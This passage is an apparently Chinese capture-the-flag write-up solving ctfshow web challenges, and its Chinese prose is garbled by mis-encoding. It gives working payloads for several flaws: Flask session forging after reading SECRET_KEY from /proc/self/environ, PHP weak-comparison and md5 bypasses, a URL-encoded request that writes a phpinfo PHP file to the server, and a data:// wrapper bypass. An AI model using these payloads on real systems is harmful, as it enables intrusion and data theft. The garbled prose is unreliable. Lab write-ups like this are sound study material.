class="hljs-string">&#x27;0x0&#x27;</span>), <span class="hljs-string">&#x27;$F&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x1</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x8&#x27;</span>)) === _0x47df21[<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x1&#x27;</span>)](<span class="hljs-number">0x9</span>, <span class="hljs-number">0xc</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x1</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x2&#x27;</span>)) === _0x47df21[<span class="hljs-string">&#x27;substring&#x27;</span>](<span class="hljs-number">0x4</span>, <span class="hljs-number">0x7</span>)) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x1</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x6&#x27;</span>)) === _0x47df21[<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x1&#x27;</span>)](<span class="hljs-number">0x0</span>, <span class="hljs-number">0x2</span>)) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x1</span>]](<span class="hljs-string">&#x27;16&#x27;</span>) === _0x47df21[<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x1&#x27;</span>)](<span class="hljs-number">0x10</span>)) &#123;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x1</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x5&#x27;</span>)) === _0x47df21[<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x1&#x27;</span>)](<span class="hljs-number">0xc</span>, <span class="hljs-number">0xe</span>)) &#123;<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x1</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0xc&#x27;</span>)) === _0x47df21[<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x1&#x27;</span>)](<span class="hljs-number">0x7</span>, <span class="hljs-number">0x9</span>)) &#123;<br>                            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x1</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0xd&#x27;</span>)) === _0x47df21[<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x1&#x27;</span>)](<span class="hljs-number">0xe</span>, <span class="hljs-number">0x10</span>)) &#123;<br>                                <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">window</span>[_0x4bbdc3[<span class="hljs-number">0x0</span>]][_0x4bbdc3[<span class="hljs-number">0x1</span>]](<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x0&#x27;</span>)) === _0x47df21[<span class="hljs-title function_">_0x51ee</span>(<span class="hljs-string">&#x27;0x1&#x27;</span>)](<span class="hljs-number">0x2</span>, <span class="hljs-number">0x4</span>)) <span class="hljs-keyword">return</span> !![];<br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> ![];<br>&#125;<br></code></pre></td></tr></table></figure>


<p>å¯ä»¥çœ‹åˆ°å¯†ç è¢«æ‹†åˆ†æˆå¾ˆå¤šéƒ¨åˆ†ï¼Œä¸”é¡ºåºè¢«æ‰“ä¹±äº†ï¼Œä½†æ˜¯å…ƒç´ èµ‹å€¼å’Œæ£€æŸ¥å¯†ç çš„é¡ºåºæ˜¯ä¸€æ ·çš„</p>
<p>å…ˆçœ‹ç¬¬ä¸€ä¸ªï¼š<code>if (window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee(&#39;0x8&#39;)) === _0x47df21[_0x51ee(&#39;0x1&#39;)](9, 12))</code>å¯¹åº”çš„å°±æ˜¯9-12ä½æ˜¯<code>window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](&#39;9-12&#39;, &#39;BE*&#39;);</code>ï¼Œå€¼ä¸ºâ€™BE*â€™</p>
<p>ç¬¬äºŒä¸ªï¼š<code>if (window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee(&#39;0x2&#39;)) === _0x47df21[&#39;substring&#39;](4, 7)) &#123;</code>å¯†ç çš„4-7ä½å°±æ˜¯<code>window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](_0x51ee(&#39;0x2&#39;), _0x51ee(&#39;0xb&#39;));</code>,å€¼ä¸º<code>_0x51ee(&#39;0xb&#39;)</code></p>
<p>å…¶ä»–çš„ä»¥æ­¤ç±»æ¨<br>ä½†æ˜¯æœ‰ä¸¤ä¸ªç‰¹æ®Šçš„åœ°æ–¹ï¼Œç¬¬4-7å’Œç¬¬16<br>ç¬¬4-7å€¼ä¸º<code>_0x51ee(&#39;0xb&#39;)</code>ï¼Œå¯¹åº”çš„æ˜¯<code>_0x575c</code>æ•°ç»„çš„ç¬¬11ä½,å€¼ä¸º<code>bb=</code><br>ç¬¬16å€¼ä¸º<code>_0x51ee(&#39;0x9&#39;)</code>ï¼Œå¯¹åº”çš„æ˜¯<code>_0x575c</code>æ•°ç»„çš„ç¬¬9ä¸ºï¼Œå€¼ä¸º<code>^7M</code></p>
<p>æˆ‘çš„åˆ†æè¿‡ç¨‹å›¾ï¼š<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web732.jpg"></p>
<h1 id="WEB736"><a href="#WEB736" class="headerlink" title="WEB736"></a>WEB736</h1><p>é¢˜ç›®å‡ºè‡ª[PASECA2019]honey_shop</p>
<p>æ‰“å¼€é¢˜ç›®ï¼Œæ˜¯ä¸€ä¸ªå•†åº—ï¼Œè¿˜æœ‰ä¸€ä¸ªä»·å€¼$1337çš„flagï¼Œä½†æˆ‘ä»¬åªæœ‰$1336<br>æ‰€ä»¥è¿™ä¸€é¢˜çš„ç›®æ ‡åº”è¯¥æ˜¯ä¿®æ”¹ä»·æ ¼æ¥è´­ä¹°flagäº†<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web736-1.jpg"></p>
<p>æŠ“åŒ…å¯ä»¥çœ‹åˆ°sessionçš„å€¼<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web736-2.jpg"></p>
<p>é€šè¿‡è„šæœ¬è§£å¯†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><span class="hljs-keyword">from</span> flask.sessions <span class="hljs-keyword">import</span> session_json_serializer<br><span class="hljs-keyword">from</span> itsdangerous <span class="hljs-keyword">import</span> base64_decode<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decryption</span>(<span class="hljs-params">payload</span>):<br>    payload, sig = payload.rsplit(<span class="hljs-string">b&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)<br>    payload, timestamp = payload.rsplit(<span class="hljs-string">b&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)<br><br>    decompress = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">if</span> payload.startswith(<span class="hljs-string">b&#x27;.&#x27;</span>):<br>        payload = payload[<span class="hljs-number">1</span>:]<br>        decompress = <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">try</span>:<br>        payload = base64_decode(payload)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not base64 decode the payload because of &#x27;</span><br>                         <span class="hljs-string">&#x27;an exception&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> decompress:<br>        <span class="hljs-keyword">try</span>:<br>            payload = zlib.decompress(payload)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not zlib decompress the payload before &#x27;</span><br>                             <span class="hljs-string">&#x27;decoding the payload&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> session_json_serializer.loads(payload)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(decryption(sys.argv[<span class="hljs-number">1</span>].encode()))<br></code></pre></td></tr></table></figure>
<p>å¾—åˆ°<code>&#123;&#39;balance&#39;: 1336, &#39;purchases&#39;: []&#125;</code><br>å…¶ä¸­balanceä¸ºå½“å‰ä½™é¢ï¼Œpurchaseså€¼ä¸ºç©º<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web736-3.jpg"></p>
<p>å¦‚æœæˆ‘ä»¬è¦ä¼ªé€ <code>session</code>ï¼Œä¿®æ”¹ä½™é¢ï¼Œé‚£ä¹ˆå°±éœ€è¦çŸ¥é“<code>SECRET_KEY</code>çš„å€¼</p>
<p>é¡µé¢ä¸­è¿˜æœ‰ä¸€ä¸ªæç¤º<code>*click to download our sweet images*</code><br>ä¸‹è½½åæ ¼å¼ä¸º<code>/download?image=</code>ï¼Œè¿™ç§æ ¼å¼å®¹æ˜“é€ æˆä»»æ„æ–‡ä»¶è¯»å–</p>
<p>è¯»å–ç¯å¢ƒå˜é‡ä¸­çš„<code>pythonç‰ˆæœ¬</code>å’Œ<code>SECRET_KEY</code></p>
<blockquote>
<p>&#x2F;proc&#x2F;self&#x2F;environ:å½“å‰æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹çš„ç¯å¢ƒå˜é‡åˆ—è¡¨</p>
</blockquote>
<p><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web736-4.jpg"></p>
<p>æ‹¿åˆ°<code>SECRET_KEY</code>åå°±å¯ä»¥è¿›è¡Œsessionä¼ªé€ äº†<br>è¦æ³¨æ„python3å’Œpython2çš„ç»“æœä¸ä¸€æ ·ï¼Œæ‰€ä»¥ä¸Šä¸€æ­¥è¯»äº†pythonçš„ç‰ˆæœ¬<br><a href="https://github.com/noraj/flask-session-cookie-manager">è„šæœ¬åœ°å€</a></p>
<p>ä¿®æ”¹é‡‘é¢åè¿›è¡Œä¼ªé€ <br><code>python flask_session_cookie_manager3.py encode -s &quot;ctfshowsecretkeyhereyouneverknow&quot; -t &quot;&#123;&#39;balance&#39;: 1337, &#39;purchases&#39;: []&#125;&quot; </code></p>
<p><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web736-5.jpg"></p>
<p>å†æ¬¡è´­ä¹°ï¼Œè´­ä¹°æˆåŠŸ<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web736-6.jpg"></p>
<h1 id="WEB743"><a href="#WEB743" class="headerlink" title="WEB743"></a>WEB743</h1><p>F12</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">&lt;!-- CTFSHOW hint:<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>))<br>            &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$c</span> != <span class="hljs-variable">$d</span> &amp;&amp; <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$c</span>) == <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$d</span>))<br>                &#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>                &#125;<br>            &#125;<br>        --&gt;<br></code></pre></td></tr></table></figure>
<p>ç®€å•å¼±æ¯”è¾ƒï¼Œä¼ æ•°ç»„<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web743.jpg"></p>
<h1 id="WEB756"><a href="#WEB756" class="headerlink" title="WEB756"></a>WEB756</h1><p>&#x2F;source.txtå¾—åˆ°æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-variable">$code</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;var_dump($<span class="hljs-subst">$code</span>);&quot;</span>);<br></code></pre></td></tr></table></figure>
<p>è¿™ä¸€é¢˜é‡ç‚¹æ˜¯ç†è§£<code>$$code</code>ï¼›</p>
<p>ä¸¾ä¸ªä¾‹å­<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web756-1.jpg"><br><code>$$b</code>å…¶å®ç›¸å½“äº<code>$($b)</code>,æ‰€ä»¥ä¼šè¾“å‡º1</p>
<p>ç†è§£åå¾ˆå®¹æ˜“æƒ³åˆ°phpä¸­è‡ªå¸¦çš„å˜é‡ä¹‹ä¸€<code>$GLOBALS</code><br>ä¼ å…¥åå°±ä¼šä»¥æ•°ç»„çš„å½¢å¼è¿”å›å€¼ï¼Œå¾—åˆ°flag</p>
<h1 id="WEB758"><a href="#WEB758" class="headerlink" title="WEB758"></a>WEB758</h1><p>&#x2F;source.txtå¾—åˆ°æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;./spider/&#x27;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><br><span class="hljs-keyword">if</span>((<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$url</span>,<span class="hljs-string">&#x27;http://127.0.0.1/&#x27;</span>) === <span class="hljs-number">0</span>) || <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$url</span>,<span class="hljs-string">&#x27;https://www.baidu.com/&#x27;</span>) === <span class="hljs-number">0</span>)&#123;<br>  <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>, <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>));<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;æ–‡ä»¶ä¿å­˜åœ¨<span class="hljs-subst">$file</span>&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>é¦–å…ˆé™åˆ¶äº†å¼€å¤´çš„å­—ç¬¦ä¸²å¿…é¡»æ˜¯<code>http://127.0.0.1/</code>æˆ–<code>https://www.baidu.com/</code><br>ç„¶åä»<code>$url</code>è·å–å†…å®¹ç„¶åå†™å…¥<code>$file</code></p>
<p>é¦–å…ˆä¼ å…¥<code>?url=http://127.0.0.1/&amp;file=&lt;?php phpinfo();?&gt;</code><br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web758-1.jpg"><br>çœ‹åˆ°æˆåŠŸä¿å­˜äº†<br>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°†è¿™ä¸ªå†…å®¹å†æ¬¡ä¿å­˜åˆ°æ–‡ä»¶ä¸­</p>
<p>å³<code>?url=http://127.0.0.1/?url=http://127.0.0.1/&amp;file=&lt;?php phpinfo();?&gt;&amp;file=1.php</code></p>
<p>ä½†æ˜¯è¦æ³¨æ„çš„æ˜¯è¦å› ä¸ºè®¿é—®ä¸¤æ¬¡æ‰€ä»¥urlç¼–ç ä¸¤æ¬¡</p>
<p>æ‰€ä»¥payloadä¸º<code>?url=http://127.0.0.1/?url=http://127.0.0.1/%26file=%253C%253Fphp%2520phpinfo%2528%2529%253B%2520%253F%253E&amp;file=1.php</code></p>
<p>è®¿é—®1.phpå°±è¡Œäº†</p>
<h1 id="WEB760"><a href="#WEB760" class="headerlink" title="WEB760"></a>WEB760</h1><p>F12</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">CTFSHOW hint:<br>                  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ereg</span> (<span class="hljs-string">&#x27;\.&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;^_^&#x27;</span>])) <span class="hljs-variable">$smile</span> = <span class="hljs-number">0</span>;<br>                  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ereg</span> (<span class="hljs-string">&#x27;%&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;^_^&#x27;</span>])) <span class="hljs-variable">$smile</span> = <span class="hljs-number">0</span>;<br>                  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ereg</span> (<span class="hljs-string">&#x27;[0-9]&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;^_^&#x27;</span>])) <span class="hljs-variable">$smile</span> = <span class="hljs-number">0</span>;<br>                  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ereg</span> (<span class="hljs-string">&#x27;http&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;^_^&#x27;</span>]) ) <span class="hljs-variable">$smile</span> = <span class="hljs-number">0</span>;<br>                  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ereg</span> (<span class="hljs-string">&#x27;https&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;^_^&#x27;</span>]) ) <span class="hljs-variable">$smile</span> = <span class="hljs-number">0</span>;<br>                  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ereg</span> (<span class="hljs-string">&#x27;ftp&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;^_^&#x27;</span>])) <span class="hljs-variable">$smile</span> = <span class="hljs-number">0</span>;<br>                  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ereg</span> (<span class="hljs-string">&#x27;telnet&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;^_^&#x27;</span>])) <span class="hljs-variable">$smile</span> = <span class="hljs-number">0</span>;<br>                  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ereg</span> (<span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>])) <span class="hljs-variable">$smile</span> = <span class="hljs-number">0</span>;<br>                  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$smile</span>) &#123;<br>                      <span class="hljs-keyword">if</span> (@<span class="hljs-title function_ invoke__">file_exists</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;^_^&#x27;</span>])) <span class="hljs-variable">$smile</span> = <span class="hljs-number">0</span>;<br>                  &#125;<br>                  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$smile</span>) &#123;<br>                    <span class="hljs-variable">$smile</span> = @<span class="hljs-title function_ invoke__">file_get_contents</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;^_^&#x27;</span>]);<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$smile</span> === <span class="hljs-string">&quot;(â—&#x27;â—¡&#x27;â—)&quot;</span>) <span class="hljs-keyword">die</span>(<span class="hljs-variable">$flag</span>);<br>                  &#125;<br></code></pre></td></tr></table></figure>

<p><code>$_SERVER[&quot;QUERY_STRING&quot;]</code> è·å–çš„æ˜¯?åé¢çš„å€¼,æ¯”å¦‚<code>http://localhost/aaa/index.php?p=222&amp;q=333</code>ä¸­<code>$_SERVER[&#39;QUERY_STRING&#39;] = &quot;p=222&amp;q=333&quot;;</code></p>
<p><code>$_GET[&#39;^_^&#39;]</code>å°±åŒ…å«äº†<code>_</code>ï¼Œä½†æ˜¯<code>$_SERVER[&quot;QUERY_STRING&quot;]</code>å´ä¸å…è®¸æœ‰<code>_</code>,è¿™æ˜¯çŸ›ç›¾çš„</p>
<p>åœ¨phpä¸­å˜é‡åä¸­çš„ç‚¹å’Œç©ºæ ¼ä¼šè¢«è½¬æ¢æˆä¸‹åˆ’çº¿ã€‚ä¾‹å¦‚ <code>&lt;input name=&quot;a.b&quot; /&gt;</code> å˜æˆäº† <code>$_REQUEST[&quot;a_b&quot;]</code><br>è¿™æ ·æˆ‘ä»¬å¯ä»¥ä¼ å…¥<code>^.^</code>æ¥ç»•è¿‡</p>
<p><code>file_exists</code>åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œè¿™é‡Œå¿…é¡»ä¸å­˜åœ¨ï¼Œä½†æ˜¯å´è¦<code>file_get_contents</code>è¯»åˆ°æ–‡ä»¶å†…å®¹</p>
<p>å› ä¸º<code>http</code>ç­‰åè®®è¢«ç¦ç”¨ï¼Œæ‰€ä»¥ä¸èƒ½è¿œç¨‹åŒ…å«äº†ï¼Œè¿™é‡Œé‡‡ç”¨<code>data://</code>æ¥è¯»å–</p>
<p>è€Œä¸”file_exists å¯¹äº data æŒ‡å‘å†…å®¹åˆ¤æ–­ä¸ºä¸å­˜åœ¨<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web760.jpg"></p>
<p>æœ€ç»ˆçš„payloadä¸ºï¼š<code>?^.^=data://text/plain,(â—&#39;â—¡&#39;â—)</code>æˆ–<code>?^.^=data://text/plain;charset=unicode,(â—&#39;â—¡&#39;â—)</code></p>
<h1 id="WEB761"><a href="#WEB761" class="headerlink" title="WEB761"></a>WEB761</h1><p>F12</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$value</span>==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$value</span>))&#123;<br>                  <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>                &#125;<br></code></pre></td></tr></table></figure>
<p>ç™¾åº¦ä¸€ä¸ª0eå¼€å¤´çš„å€¼ï¼Œä¸”è¿™ä¸ªå€¼md5åè¿˜æ˜¯0eå¼€å¤´<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web761.jpg"></p>
<h1 id="WEB764"><a href="#WEB764" class="headerlink" title="WEB764"></a>WEB764</h1><p>source.txtçœ‹åˆ°æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$login</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(!@<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$login</span>[<span class="hljs-string">&#x27;cookie&#x27;</span>])||<span class="hljs-variable">$login</span>[<span class="hljs-string">&#x27;cookie&#x27;</span>] != @<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;<br>      <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!&#x27;</span>);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$login</span>[<span class="hljs-string">&#x27;cookie&#x27;</span>],<span class="hljs-number">17</span>,<span class="hljs-number">7</span>));<br>      <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;&lt;?php \$flag=&quot;</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>.<span class="hljs-variable">$flag</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>.<span class="hljs-string">&quot;?&gt;&quot;</span>;<br>      <span class="hljs-variable">$filename</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-title function_ invoke__">mt_rand</span>().<span class="hljs-string">&quot;.php&quot;</span>;<br>      <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-variable">$content</span>);<br>      <span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-title function_ invoke__">mt_rand</span>());<br>      <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key&#x27;</span>] == <span class="hljs-title function_ invoke__">mt_rand</span>())<br>      &#123;<br>          <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>($&#123;<span class="hljs-variable">$_POST</span>[<span class="hljs-title function_ invoke__">mt_rand</span>()]&#125;);<br>      &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ç¬¬ä¸€ä¸ªifåˆ¤æ–­ï¼š<br>å› ä¸º<code>!isset($login[&#39;cookie&#39;])</code>è‚¯å®šä¸ºfalse<br>æ‰€ä»¥è¦æ»¡è¶³<code>$login[&#39;cookie&#39;]</code>ä¸<code>md5($_SESSION[&#39;flag&#39;])</code>ç›¸ç­‰</p>
<p>åœ¨æœ¬åœ°è·‘å‡º<code>md5($_SESSION[&#39;flag&#39;])</code>ç»“æœä¸º<code>d41d8cd98f00b204e9800998ecf8427e</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>æ ¹æ®é¢˜ç›®ä¼ <code>?id[cookie]=d41d8cd98f00b204e9800998ecf8427e</code>,ä¸åœ¨è¿”å›error</p>
<p>elseå†…å®¹åˆ†æï¼š<br>ä»¥cookieä¸­ç¬¬17ä½å¼€å§‹å‘å7ä½,æ’­ç§éšæœºæ•°ç”Ÿæˆå™¨</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$login</span>[<span class="hljs-string">&#x27;cookie&#x27;</span>],<span class="hljs-number">17</span>,<span class="hljs-number">7</span>));<br></code></pre></td></tr></table></figure>

<p>æ‹¼æ¥å­—ç¬¦ä¸²å’Œflagï¼Œèµ‹ç»™<code>$content</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;&lt;?php \$flag=&quot;</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>.<span class="hljs-variable">$flag</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>.<span class="hljs-string">&quot;?&gt;&quot;</span>;<br></code></pre></td></tr></table></figure>


<p>è¿”å›ä¸€ä¸ªéšæœºæ•°ï¼Œå¹¶åŠ ä¸Š.phpåç¼€,èµ‹ç»™<code>$filename</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$filename</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-title function_ invoke__">mt_rand</span>().<span class="hljs-string">&quot;.php&quot;</span>;<br></code></pre></td></tr></table></figure>

<p>å†™å…¥æ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-variable">$content</span>);<br></code></pre></td></tr></table></figure>


<p>ä»¥éšæœºæ•°ç”Ÿæˆå™¨ç”Ÿæˆçš„ç¬¬äºŒä¸ªéšæœºæ•°é‡æ–°ç”Ÿæˆæ–°çš„éšæœºæ•°ç”Ÿæˆå™¨</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-title function_ invoke__">mt_rand</span>());<br></code></pre></td></tr></table></figure>


<p>POSTä¼ å‚,ä»¤å‚æ•°keyä¸æ–°çš„éšæœºæ•°ç”Ÿæˆå™¨ç”Ÿæˆçš„éšæœºæ•°ç›¸ç­‰,å³å¯è¿›å…¥IFåˆ¤æ–­</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key&#x27;</span>] == <span class="hljs-title function_ invoke__">mt_rand</span>())<br></code></pre></td></tr></table></figure>


<p>ç”Ÿæˆç¬¬äºŒä¸ªéšæœºæ•°</p>
